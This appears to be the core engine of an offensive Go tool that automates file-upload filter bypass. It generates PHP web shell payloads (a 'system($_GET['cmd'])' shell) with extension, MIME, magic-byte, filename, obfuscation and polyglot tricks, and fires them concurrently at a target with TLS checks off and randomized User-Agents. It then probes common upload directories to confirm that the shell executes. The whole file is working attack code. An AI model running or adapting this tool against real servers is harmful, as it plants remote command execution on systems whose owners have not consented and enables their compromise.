package scanner

import (
	"crypto/md5"
	"crypto/tls"
	"encoding/hex"
	"fmt"
	"fux/bypass"
	"fux/config"
	"fux/parser"
	"io"
	"math/rand"
	"net/http"
	"net/url"
	"os"
	"strings"
	"sync"
	"sync/atomic"
	"time"
)

// Common User-Agent strings for randomization
var defaultUserAgents = []string{
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:121.0) Gecko/20100101 Firefox/121.0",
	"Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
	"Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
	"Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Edge/120.0.0.0",
}

// Engine is the main scanning engine
type Engine struct {
	Config       *config.Config
	Request      *config.RawRequest
	Client       *http.Client
	Detector     *Detector
	Reporter     *Reporter
	Stats        *config.ScanStats
	UserAgents   []string
	successCount int64 // Atomic counter for thread safety
	mu           sync.Mutex
}

// NewEngine creates a new scanner engine
func NewEngine(cfg *config.Config) (*Engine, error) {
	// Parse request if file provided
	var req *config.RawRequest
	var err error

	if cfg.RequestFile != "" {
		req, err = parser.ParseRawRequest(cfg.RequestFile)
		if err != nil {
			return nil, err
		}
	} else {
		return nil, fmt.Errorf("request file is required")
	}

	// Override config with detected values if needed
	if cfg.TargetURL == "" {
		cfg.TargetURL = parser.GetTargetURL(req)
	}
	if cfg.FileParam == "" && req.FileParam != "" {
		cfg.FileParam = req.FileParam
	}

	// Validate file parameter was detected
	if cfg.FileParam == "" {
		return nil, fmt.Errorf("could not detect file parameter. Please specify with -p flag")
	}

	// Setup HTTP client with proper settings
	transport := &http.Transport{
		TLSClientConfig: &tls.Config{InsecureSkipVerify: true},
		MaxIdleConns:    100,
		IdleConnTimeout: 90 * time.Second,
	}

	if cfg.Proxy != "" {
		proxyURL, err := url.Parse(cfg.Proxy)
		if err != nil {
			return nil, fmt.Errorf("invalid proxy URL: %v", err)
		}
		transport.Proxy = http.ProxyURL(proxyURL)
	}

	client := &http.Client{
		Transport: transport,
		Timeout:   time.Duration(cfg.Timeout) * time.Second,
		CheckRedirect: func(req *http.Request, via []*http.Request) error {
			// Don't follow redirects automatically
			return http.ErrUseLastResponse
		},
	}

	// Initialize stats
	stats := &config.ScanStats{
		StartTime:       time.Now(),
		UniqueSuccesses: make(map[string]bool),
	}

	engine := &Engine{
		Config:     cfg,
		Request:    req,
		Client:     client,
		Detector:   NewDetector(),
		Reporter:   NewReporter(cfg.Verbose, cfg.OutputFile),
		Stats:      stats,
		UserAgents: defaultUserAgents,
	}

	// Load custom User-Agents if specified
	if cfg.UserAgentFile != "" {
		content, err := os.ReadFile(cfg.UserAgentFile)
		if err != nil {
			return nil, fmt.Errorf("failed to read User-Agent file: %v", err)
		}

		var customUA []string
		lines := strings.Split(string(content), "\n")
		for _, line := range lines {
			line = strings.TrimSpace(line)
			if line != "" {
				customUA = append(customUA, line)
			}
		}

		if len(customUA) == 0 {
			return nil, fmt.Errorf("User-Agent file is empty")
		}
		engine.UserAgents = customUA
	}

	// Set config on detector for custom match string support
	engine.Detector.SetConfig(cfg)

	return engine, nil
}

// GeneratePayloads gathers all payload variations based on config filters
func (e *Engine) GeneratePayloads() []config.BypassPayload {
	var payloads []config.BypassPayload
	baseContent := []byte("<?php system($_GET['cmd']); ?>")

	// Check if only specific category is requested
	onlyCategory := strings.ToLower(e.Config.OnlyCategory)

	// 1. Extension Bypasses
	if !e.Config.SkipExtension && (onlyCategory == "" || onlyCategory == "extension") {
		payloads = append(payloads, bypass.ExtensionPayloads(baseContent)...)
	}

	// 2. MIME Type Bypasses
	if !e.Config.SkipMIME && (onlyCategory == "" || onlyCategory == "mime") {
		payloads = append(payloads, bypass.MIMEPayloads(baseContent)...)
	}

	// 3. Magic Bytes Bypasses
	if !e.Config.SkipMagic && (onlyCategory == "" || onlyCategory == "magic") {
		payloads = append(payloads, bypass.MagicBytesPayloads(baseContent)...)
	}

	// 4. Filename Obfuscation
	if !e.Config.SkipFilename && (onlyCategory == "" || onlyCategory == "filename") {
		payloads = append(payloads, bypass.FilenamePayloads(baseContent)...)
	}

	// 5. Content Obfuscation
	if !e.Config.SkipContent && (onlyCategory == "" || onlyCategory == "content") {
		payloads = append(payloads, bypass.ContentPayloads()...)
	}

	// 6. Polyglots
	if !e.Config.SkipPolyglot && (onlyCategory == "" || onlyCategory == "polyglot") {
		payloads = append(payloads, bypass.PolyglotPayloads()...)
	}

	return payloads
}

// StartScan initiates the scanning process
func (e *Engine) StartScan() {
	e.Reporter.PrintBanner()

	// Display configuration
	e.Reporter.PrintConfig(e.Config, e.Request)

	payloads := e.GeneratePayloads()
	if len(payloads) == 0 {
		fmt.Printf("%s[!] No payloads to test. Check your filter settings.%s\n", config.ColorRed, config.ColorReset)
		return
	}

	e.Stats.TotalPayloads = len(payloads)
	e.Reporter.PrintScanStart(e.Config.TargetURL, len(payloads))

	results := make(chan config.ScanResult, len(payloads))
	sem := make(chan struct{}, e.Config.Threads) // Semaphore for concurrency
	var wg sync.WaitGroup

	// Progress ticker
	done := make(chan bool)
	go e.showProgress(done)

	// Worker routine
	for i, p := range payloads {
		wg.Add(1)
		go func(idx int, payload config.BypassPayload) {
			defer wg.Done()
			sem <- struct{}{} // Acquire
			defer func() { <-sem }()

			// Add delay if configured
			if e.Config.Delay > 0 && idx > 0 {
				time.Sleep(time.Duration(e.Config.Delay) * time.Millisecond)
			}

			result := e.TestPayload(payload)
			results <- result

			// Update stats atomically
			atomic.AddInt64(&e.successCount, 0) // Just to track progress
			e.mu.Lock()
			e.Stats.CompletedCount++
			if result.Success {
				e.Stats.SuccessCount++
			}
			if result.Error != "" {
				e.Stats.ErrorCount++
			}
			e.mu.Unlock()
		}(i, p)
	}

	// Result processor
	var successResults []config.ScanResult
	go func() {
		for res := range results {
			if res.Success {
				// Check for duplicate responses
				if res.ResponseHash != "" {
					e.mu.Lock()
					if e.Stats.UniqueSuccesses[res.ResponseHash] {
						e.mu.Unlock()
						continue // Skip duplicate
					}
					e.Stats.UniqueSuccesses[res.ResponseHash] = true
					e.mu.Unlock()
				}
				successResults = append(successResults, res)
			}
			e.Reporter.ReportResult(res)
		}
	}()

	wg.Wait()
	close(results)
	done <- true

	// Wait for result processing to finish
	time.Sleep(200 * time.Millisecond)

	e.Reporter.PrintSummary(e.Stats, time.Since(e.Stats.StartTime))

	// Save results to file if specified
	if e.Config.OutputFile != "" {
		e.Reporter.SaveResults(successResults, e.Config.OutputFile)
	}
}

// showProgress displays a progress indicator
func (e *Engine) showProgress(done chan bool) {
	ticker := time.NewTicker(1 * time.Second)
	defer ticker.Stop()

	for {
		select {
		case <-done:
			fmt.Print("\r\033[K") // Clear line
			return
		case <-ticker.C:
			e.mu.Lock()
			completed := e.Stats.CompletedCount
			total := e.Stats.TotalPayloads
			successes := e.Stats.SuccessCount
			e.mu.Unlock()

			if total > 0 {
				pct := float64(completed) / float64(total) * 100
				fmt.Printf("\r%s[*] Progress: %d/%d (%.1f%%) | Found: %d%s",
					config.ColorDim, completed, total, pct, successes, config.ColorReset)
			}
		}
	}
}

// TestPayload sends a request with the given payload
func (e *Engine) TestPayload(payload config.BypassPayload) config.ScanResult {
	startTime := time.Now()
	result := config.ScanResult{
		Payload: payload,
	}

	// Rebuild request with payload
	reqBytes, err := parser.RebuildRequestWithPayload(e.Request, payload)
	if err != nil {
		result.Error = err.Error()
		result.ErrorReason = "Request build failed"
		return result
	}

	// Create request URL
	reqURL := e.Config.TargetURL
	if reqURL == "" {
		reqURL = parser.GetTargetURL(e.Request)
	}

	// Parse the rebuilt request to get headers
	parsedReq, err := parser.ParseRawRequestBytes(reqBytes)
	if err != nil {
		result.Error = err.Error()
		result.ErrorReason = "Request parse failed"
		return result
	}

	// Create new HTTP request
	parts := parser.SplitRequestBytes(reqBytes)
	httpReq, err := http.NewRequest(e.Request.Method, reqURL, parts.BodyReader)
	if err != nil {
		result.Error = err.Error()
		result.ErrorReason = "HTTP request creation failed"
		return result
	}

	httpReq.ContentLength = parts.ContentLength

	// Set Headers from original request
	for k, v := range parsedReq.Headers {
		if strings.ToLower(k) != "host" && strings.ToLower(k) != "content-length" {
			httpReq.Header.Set(k, v)
		}
	}

	// Randomize User-Agent if configured
	if e.Config.RandomAgent && len(e.UserAgents) > 0 {
		httpReq.Header.Set("User-Agent", e.UserAgents[rand.Intn(len(e.UserAgents))])
	}

	// Send request
	resp, err := e.Client.Do(httpReq)
	if err != nil {
		result.Error = err.Error()
		result.ErrorReason = "Request failed"
		return result
	}
	defer resp.Body.Close()

	result.RequestTime = time.Since(startTime)

	// Read response body
	bodyBytes, err := io.ReadAll(resp.Body)
	if err != nil {
		result.Error = err.Error()
		result.ErrorReason = "Response read failed"
		return result
	}

	bodyStr := string(bodyBytes)
	result.StatusCode = resp.StatusCode
	result.ResponseSize = len(bodyBytes)
	result.ResponseBody = bodyStr

	// Generate response hash for deduplication
	hash := md5.Sum([]byte(fmt.Sprintf("%d-%d-%s", resp.StatusCode, len(bodyBytes), bodyStr[:min(100, len(bodyStr))])))
	result.ResponseHash = hex.EncodeToString(hash[:])

	// Analyze result
	success, path := e.Detector.DetectSuccess(resp, bodyStr, payload)
	result.Success = success
	result.UploadPath = path

	// If not successful, try to determine the reason
	if !success {
		result.ErrorReason = e.Detector.AnalyzeError(bodyStr)
	}

	// Verify if requested and successful
	if success && e.Config.VerifyUpload && path != "" {
		result.Verified = e.VerifyAccess(path)
	}

	return result
}

// VerifyAccess tries to reach the uploaded file
func (e *Engine) VerifyAccess(path string) bool {
	// If path is relative, construct full URL
	target := path
	if !strings.HasPrefix(path, "http") {
		baseURL := e.Config.TargetURL

		// Try to get base path without the upload endpoint
		parsedURL, err := url.Parse(baseURL)
		if err == nil {
			// Remove the path and try common upload directories
			basePaths := []string{
				parsedURL.Scheme + "://" + parsedURL.Host + "/" + strings.TrimPrefix(path, "/"),
				parsedURL.Scheme + "://" + parsedURL.Host + "/uploads/" + strings.TrimPrefix(path, "/"),
				parsedURL.Scheme + "://" + parsedURL.Host + "/files/" + strings.TrimPrefix(path, "/"),
			}

			for _, bp := range basePaths {
				resp, err := e.Client.Get(bp)
				if err == nil {
					resp.Body.Close()
					if resp.StatusCode == 200 {
						return true
					}
				}
			}
			return false
		}

		// Simple join fallback
		if strings.HasSuffix(baseURL, "/") {
			target = baseURL + path
		} else {
			target = baseURL + "/" + path
		}
	}

	resp, err := e.Client.Get(target)
	if err != nil {
		return false
	}
	defer resp.Body.Close()

	// Check if response contains indicators of execution
	if resp.StatusCode == 200 {
		body, _ := io.ReadAll(resp.Body)
		bodyStr := string(body)
		// Look for signs that PHP executed (no raw PHP tags in response)
		if !strings.Contains(bodyStr, "<?php") && !strings.Contains(bodyStr, "<?=") {
			return true
		}
	}

	return resp.StatusCode == 200
}

// min returns the minimum of two integers
func min(a, b int) int {
	if a < b {
		return a
	}
	return b
}
